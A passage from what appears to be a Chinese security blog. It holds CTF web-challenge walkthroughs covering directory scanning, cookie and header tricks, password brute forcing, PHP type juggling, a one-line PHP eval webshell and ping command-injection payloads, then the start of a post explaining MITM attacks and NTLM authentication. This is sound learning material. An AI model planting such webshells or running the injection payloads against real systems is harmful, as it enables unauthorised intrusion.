Google为Googlebot(可查阅相关官网的爬虫列表)</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-agent：指定对哪些爬虫生效<br>Disallow：指定要屏蔽的网址<br></code></pre></td></tr></table></figure><p>Disallow 行列出的是要拦截的网页，以正斜线 (/) 开头，可以列出特定的网址或模式。要屏蔽整个网站，使用正斜线即可;要屏蔽某一目录以及其中的所有内容，在目录名后添加正斜线;要屏蔽某个具体的网页，就指出这个网页。</p><p>本题若没有提示,也可以通过网站后台扫描出敏感页面</p><p><img src="https://s2.loli.net/2022/06/07/mHKSuMc8ZgrtkY9.png" alt="image-20220607004124129" /></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607004211230.png" alt="image-20220607004211230" /></p><p>查看f1ag_1s_h3re.php页面得到flag</p><hr /><h1 id="backup"><a class="markdownIt-Anchor" href="#backup"></a> backup</h1><p>根据提示网站的备份文件，通过dirsearch扫描网站目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python dirsearch -u http://111.200.241.244:60228<br></code></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112427174.png" alt="image-20220607112427174" /></p><p>将文件后缀改为.php查看后获取flag</p><hr /><h1 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> cookie</h1><p>根据题目提示查看cookie，可在edge的F12开发者选项中选中应用程序一栏查看存储的cookie</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607112921575.png" alt="image-20220607112921575" /></p><p>访问cookie.php后根据提示查看该页面的http响应头部获取flag</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607113142926.png" alt="image-20220607113142926" /></p><hr /><h1 id="disabled_button"><a class="markdownIt-Anchor" href="#disabled_button"></a> disabled_button</h1><p>打开页面发现按钮不能点击，审计源码</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231314286.png" alt="image-20220607231314286" /></p><p>这里input标签设为disabled，点击按钮执行动作，可以直接修改本地的元素为enable</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607231601449.png" alt="image-20220607231601449" /></p><p>也可以<strong>分析点击按钮的行为</strong>，这里点击flag按钮后会向该页面<strong>以POST提交auth=flag的表单数据</strong>，可以主动发送该请求</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607232508454.png" alt="image-20220607232508454" /></p><hr /><h1 id="weak_auth"><a class="markdownIt-Anchor" href="#weak_auth"></a> weak_auth</h1><p>登录页面，随便输入提示用户名为admin，再次登录提示使用字典，弱口令爆破</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220607233644435.png" alt="image-20220607233644435" /></p><p>用Burp中Intruder模块进行字典爆破(<strong>前提有弱口令字典</strong>)密码为<strong>123456</strong></p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608000246499.png" alt="image-20220608000246499" /></p><hr /><h1 id="simple_php"><a class="markdownIt-Anchor" href="#simple_php"></a> simple_php</h1><p>在php中 == 或者 &lt; 和 &gt; 都是弱类型比较，只会<strong>比较值不比较类型</strong></p><blockquote><p>一个数字和一个字符串进行比较，PHP会把<strong>字符串转换成数字</strong>再进行比较<br />PHP转换的规则的是：<strong>若字符串以数字开头，则取前面所有数字作为转换结果，若无则为0</strong></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-number">233333</span>);       <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-string">&quot;233333&quot;</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">233333</span> == <span class="hljs-string">&quot;233333abc&quot;</span>);  <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-number">0e12345</span> == <span class="hljs-number">0e54321</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;abcd&quot;</span> == <span class="hljs-number">0</span>);            <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;1abc&quot;</span> == <span class="hljs-number">0</span>);            <span class="hljs-comment"># 0</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>0e开头在php解释为科学计数法，统一变为0，所以相等(常在md5比较中绕过使用)</p><p>is_numeric函数判断是否为<strong>数字</strong>或者**数字字符串 **(十进制和十六进制)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">233333</span>);       <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;233333&quot;</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-number">0x233333</span>);     <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;0x233333&quot;</span>);   <span class="hljs-comment"># 1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-string">&quot;233333abc&quot;</span>);  <span class="hljs-comment"># 0</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据源码构造payload</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608011650618.png" alt="image-20220608011650618" /></p><p>其中*为除数字外的任意字符</p><hr /><h1 id="xff_referer"><a class="markdownIt-Anchor" href="#xff_referer"></a> xff_referer</h1><p>xff为<strong>X-Forwarder-For</strong>，为http报文请求头格式的一种，用来识别在代理服务模式下<strong>客户端的真实ip</strong></p><p><strong>referer</strong>字段表示页面来源地址，在hackbar中添加如下，不知道为什么edge下的发包有问题 😓</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608103355127.png" alt="image-20220608103355127" /></p><hr /><h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> webshell</h1><p>经典一句话木马的webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以用各种webshell工具连接，这里用antsword</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608104258600.png" alt="image-20220608104258600" /></p><p>进去发现该环境不出网，无法反弹shell，直接得flag完事</p><hr /><h1 id="command_execution"><a class="markdownIt-Anchor" href="#command_execution"></a> command_execution</h1><p>典型的命令注入，正常的ping后面注入实现RCE</p><p>linux中通过命令操作符来实现</p><h3 id="和号操作符"><a class="markdownIt-Anchor" href="#和号操作符"></a> &quot;&amp;&quot;和号操作符</h3><p>‘<strong>&amp;</strong>’的作用是使命令在后台运行。只要在命令后面跟上一个空格和 ‘<strong>&amp;</strong>’。也可以一次性在后台<strong>同时</strong>运行多个命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping www.baidu.com &amp; apt-get update &amp;  <br></code></pre></td></tr></table></figure><h3 id="分号操作符"><a class="markdownIt-Anchor" href="#分号操作符"></a> &quot;;&quot;分号操作符</h3><p>使用’<strong>;</strong>'将命令分割，使得各个命令<strong>依次执行</strong>，输出结果，<strong>互不影响</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c3 127.0.0.1;<span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><h3 id="与操作符"><a class="markdownIt-Anchor" href="#与操作符"></a> &quot;&amp;&amp;&quot;与操作符</h3><p>如果第一个命令执行成功，<strong>与操作符 (&amp;&amp;)<strong>才会执行第二个命令，也就是说，第一个命令退出状态是</strong>0</strong>, 该操作符在检查最后一个命令的执行状态时很有用</p><p>程序编译安装(先检查编译情况)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>网站访问(先判断主机是否在线)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c3 www.baidu.com &amp;&amp; links www.baidu.com<br></code></pre></td></tr></table></figure><h3 id="或操作符"><a class="markdownIt-Anchor" href="#或操作符"></a> &quot;||&quot;或操作符</h3><p><strong>或操作符</strong> (<strong>||</strong>)很像编程中的 <strong>if-else</strong> 语句, 该操作符允许你在第一个命令失败的情况下(<strong>退出状态为1</strong>)执行第二个命令。但第一个命令执行成功(退出状态为<strong>0</strong>)就不会执行第二个命令，效果为<strong>至少得有一个指令执行成功</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update ||<span class="hljs-built_in"> ping </span>-c3 www.baidu<span class="hljs-built_in">..</span>com<br></code></pre></td></tr></table></figure><h3 id="管道操作符"><a class="markdownIt-Anchor" href="#管道操作符"></a> &quot;|&quot;管道操作符</h3><p>管道操作符(<strong>|</strong>)会将第一个指令的输入结果作为第二个指令的输入，最终在屏幕中展示的是<strong>最后一个指令的输出情况</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> system.log | grep hello<br></code></pre></td></tr></table></figure><blockquote><p>上面的指令可以让我们过滤出<code>system.log</code>这个文件中包含<code>hello</code>字符串的行，然后打印到屏幕上。</p></blockquote><p>本题可以通过管道操作符**(|)<strong>或者与操作符</strong>(&amp;&amp;)<strong>和分号操作符</strong>(😉**实现命令注入</p><p>首先找到flag的位置为 <strong>/home/flag.txt</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1;find / -name <span class="hljs-string">&quot;flag&quot;</span><br>127.0.0.1 | find / -name <span class="hljs-string">&quot;flag.txt&quot;</span><br>127.0.0.1 &amp;&amp; find / -name <span class="hljs-string">&quot;flag.txt&quot;</span><br></code></pre></td></tr></table></figure><p>获取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 | <span class="hljs-built_in">cat</span> /home/flag.txt<br></code></pre></td></tr></table></figure><hr /><h1 id="simple_js"><a class="markdownIt-Anchor" href="#simple_js"></a> simple_js</h1><p>审阅js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params">pass_enc</span>)&#123;<br>        <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>        <span class="hljs-keyword">var</span> tab  = pass_enc.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>        <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> i,j,k,l=<span class="hljs-number">0</span>,m,n,o,p = <span class="hljs-string">&quot;&quot;</span>;<br>    i = <span class="hljs-number">0</span>;<br>    j = tab.<span class="hljs-property">length</span>;<br>        k = j + (l) + (n=<span class="hljs-number">0</span>);<br>        n = tab2.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;<br>            o = tab[i-l];<br>            p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(i = (o=<span class="hljs-number">0</span>); i &lt; (k = j = n); i++ )&#123;<br>           o = tab[i-l];<br>           <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">5</span> &amp;&amp; i &lt; k-<span class="hljs-number">1</span>) p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>        &#125;<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[<span class="hljs-number">17</span>]);<br>        pass = p;<br>    <span class="hljs-keyword">return</span> pass;<br>    &#125;<br>    <span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-title function_">dechiffre</span>(<span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));<br><br>    h = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;Enter password&#x27;</span>);<br>    <span class="hljs-title function_">alert</span>( <span class="hljs-title function_">dechiffre</span>(h) );<br></code></pre></td></tr></table></figure><p>乍眼一看很复杂，给了很多混淆，要弄清楚代码的意图；从输入什么返回值不变这一角度触发，故进行无用代码的处理简化</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> i;<br>    <span class="hljs-keyword">var</span> p = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; tab2.<span class="hljs-property">length</span>; i++) &#123;<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数就是将一个固定数字数组进行ASCⅡ字符编码后拼接，与我们的输入没有任何关系</p><p>题目中给出可疑的<strong>16进制字符串</strong>，将变量替换执行</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-string">&quot;<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x35</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x36</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x34</span>\x2c<span class="hljs-char escape_">\x37</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x35</span>\x2c<span class="hljs-char escape_">\x36</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x34</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x36</span>\x2c<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x30</span><span class="hljs-char escape_">\x37</span>\x2c<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x39</span>\x2c<span class="hljs-char escape_">\x35</span><span class="hljs-char escape_">\x30</span>&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> i;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> p = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; tab2.<span class="hljs-property">length</span>; i++) &#123;</span><br><span class="language-javascript">        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[i]);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">return</span> p;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-title function_">dechiffre</span>());</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>以html方式打开</p><p><img src="https://fastly.jsdelivr.net/gh/Blue-Arc/PicGo@main/img/image-20220608153642079.png" alt="image-20220608153642079" /></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>基于NTLM的中间人攻击</title>
    <link href="/2022/06/02/MITM/"/>
    <url>/2022/06/02/MITM/</url>
    
    <content type="html"><![CDATA[<h1 id="中间人攻击"><a class="markdownIt-Anchor" href="#中间人攻击"></a> 中间人攻击</h1><p>中间人攻击(Man-in-the-Middle Attack，简称“<strong>MITM</strong>攻击”)是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。中间人攻击一个(缺乏)相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信 任的数字证书认证机构颁发，并且能执行双向身份认证。</p><p>中间人攻击过程</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>客户端发送请求到服务端，请求被中间人截获。<br><span class="hljs-number">2.</span>服务器向客户端发送公钥。<br><span class="hljs-number">3.</span>中间人截获公钥，保留在自己手上。然后自己生成一个【伪造的】公钥，发给客户端。<br><span class="hljs-number">4.</span>客户端收到伪造的公钥后，生成加密<span class="hljs-built_in">hash</span>值发给服务器。<br><span class="hljs-number">5.</span>中间人获得加密<span class="hljs-built_in">hash</span>值，用自己的私钥解密获得真秘钥。同时生成假的加密<span class="hljs-built_in">hash</span>值，发给服务器。<br><span class="hljs-number">6.</span>服务器用私钥解密获得假密钥。然后加密数据传输给客户端。<br></code></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/02/G7D8KHj46TNdaiJ.png" alt="image-20210802165409819" style="zoom: 67%;" /><blockquote><p><em><strong>中间人攻击的核心理念在于截取hash和传递(假冒认证)</strong></em></p></blockquote><h2 id="0x01-域和工作组"><a class="markdownIt-Anchor" href="#0x01-域和工作组"></a> 0x01 域和工作组</h2><p>工作组和域宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。</p><p>工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<strong>点对点</strong>。因此，在工作组环境下进行访问认证，仅涉及Client和Server。我们使用的个人计算机，默认便处于<strong>WORKGROUP</strong>工作组环境下</p><p>域是一个有安全边界的计算机集合，同一个域中的计算机通过共同的第三方信任机构建立信任关系，这个第三方信任机构角色由DC(域控制器)担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong></p><p>VMware中域环境的搭建详见：</p><blockquote><p><a href="https://blog.csdn.net/weixin_36711901/article/details/102995640">VMware中用虚拟机模拟搭建域（步骤、讲解详实，并以浅显的方式讲解了VMware中的三种网络模式、IP配置），Windows Server 2008 R2为域控服务器，Win7为域成员服务器_胖胖的飞象的博客-CSDN博客_虚拟机怎么创建域</a></p></blockquote><h2 id="0x02-ntlm认证windows"><a class="markdownIt-Anchor" href="#0x02-ntlm认证windows"></a> 0x02 NTLM认证(Windows)</h2><h3 id="本地认证"><a class="markdownIt-Anchor" href="#本地认证"></a> 本地认证</h3><p>Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在 SAM (<em>Security Account Manager Database</em>，安全账号管理数据库)文件中。</p><blockquote><p>SAM文件的路径是 <code>%SystemRoot%\system32\config\sam</code></p></blockquote><p>在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成 <em><code>NTLM Hash</code></em>，与 SAM数据库中的 <em><code>NTLM Hash</code></em> 进行比较，从而实现认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; 认证<br></code></pre></td></tr></table></figure><p>首先，用户注销、重启、锁屏后，操作系统会让 <code>winlogon</code>显示登录界面，也就是输入框，接收输入后，将密码交给 <code>lsass</code>进程，<em>这个进程中会存一份明文密码</em>，将明文密码加密成<code>NTLM Hash</code>，对比 SAM数据库中的Hash进行验证</p><h4 id="ntlm-hash的生成"><a class="markdownIt-Anchor" href="#ntlm-hash的生成"></a> NTLM Hash的生成</h4><ul><li>明文密码：<code>123456</code></li><li>首先，密码经过十六进制ASCⅡ转为 -&gt; <code>313233343536</code></li><li>将十六进制结果转为 Unicode格式 -&gt;<code>310032003300340035003600</code></li><li>以 Hex（16进制）数据作MD4加密 -&gt;<code>32ED87BDB5FDC5E9CBA88547376818D4</code></li></ul><blockquote><p>由于NTLM Hash的算法公开，故获得的Hash可暴力破解(MD4单向不可逆)</p></blockquote><h3 id="网络认证"><a class="markdownIt-Anchor" href="#网络认证"></a> 网络认证</h3><p>NTLM凭据包括<strong>域名</strong>，<strong>用户名</strong>和<strong>用户密码的单向Hash</strong>。用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性</p><p>NTLM的认证方式分为交互式和交互式</p><ul><li>通过网络进行的<strong>交互式NTLM身份验证</strong>通常涉及两个系统：<strong>客户端系统</strong>，用户用于请求身份验证；<strong>域控制器</strong>，其中保留与用户密码有关的信息；交互式提供必要凭据，应用场景通常为用户要登录某台客户端</li><li><strong>NTLM非交互式身份验证</strong>通常涉及NTLM三个系统：<strong>客户端</strong>，<strong>服务器</strong>和<strong>代表服务器进行身份验证计算的域控制器</strong>；无需交互式提供凭据，实际应用更多为<strong>已登录某客户端的用户去请求另一台服务器的资源</strong> ，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源</li></ul><h4 id="工作组环境ntlm认证流程抗重放技术"><a class="markdownIt-Anchor" href="#工作组环境ntlm认证流程抗重放技术"></a> 工作组环境NTLM认证流程（抗重放技术）</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>用户访问客户机并提供域名，用户名，密码。客户端计算密码的<span class="hljs-built_in">Hash</span>，并丢弃实际密码。<br><span class="hljs-number">2.</span>客户端将用户名发送到服务器。<br><span class="hljs-number">3.</span>服务器生成一个<span class="hljs-number">16</span>字节的随机数Challenge并发送给客户端。<br><span class="hljs-number">4.</span>客户端使用用户密码的<span class="hljs-built_in">Hash</span>对Challenge进行加密，然后将结果response(Net-NTLM <span class="hljs-built_in">hash</span>)返回给服务器。<br><span class="hljs-number">5.</span>服务器使用用户名从SAM数据库中检索用户密码<span class="hljs-built_in">Hash</span>，使用此密码<span class="hljs-built_in">Hash</span>对Challenge进行加密。<br><span class="hljs-number">6.</span>服务器将其加密的Challenge（在步骤<span class="hljs-number">5</span>中）与客户端计算的response（在步骤<span class="hljs-number">4</span>中）进行比较。如果它们相同则身份验证成功。<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/02/MFWRKurpgJbavOH.png" alt="image-20210802213128690" /></p><h4 id="域环境ntlm认证"><a class="markdownIt-Anchor" href="#域环境ntlm认证"></a> 域环境NTLM认证</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>用户访问客户机并提供域名，用户名，密码。客户端计算密码的<span class="hljs-built_in">Hash</span>，并丢弃实际密码。<br><span class="hljs-number">2.</span>客户端将用户名发送到服务器。<br><span class="hljs-number">3.</span>服务器生成一个<span class="hljs-number">16</span>字节的随机数Challenge并发送给客户端。<br><span class="hljs-number">4.</span>客户端使用用户密码的<span class="hljs-built_in">Hash</span>对Challenge进行加密，然后将结果response(Net-NTLM <span class="hljs-built_in">hash</span>)返回给服务器。<br><span class="hljs-number">5.</span>服务器将三个信息发送到域控制器：用户名，发送给客户机的Challenge，返回给服务器的response。<br><span class="hljs-number">6.</span>域控制器使用用户名从SAM数据库中检索用户密码<span class="hljs-built_in">Hash</span>。使用此密码<span class="hljs-built_in">Hash</span>对Challenge进行加密。<br><span class="hljs-number">7.</span>域控制器将其加密的Challenge（在步骤<span class="hljs-number">6</span>中）与客户端计算的response（在步骤<span class="hljs-number">4</span>中）进行比较。如果它们相同则身份验证成功。<br></code></pre></td></tr></table></figure><img src="https://i.loli.net/2021/08/03/ChDv1n8sLBeVJdz.png" 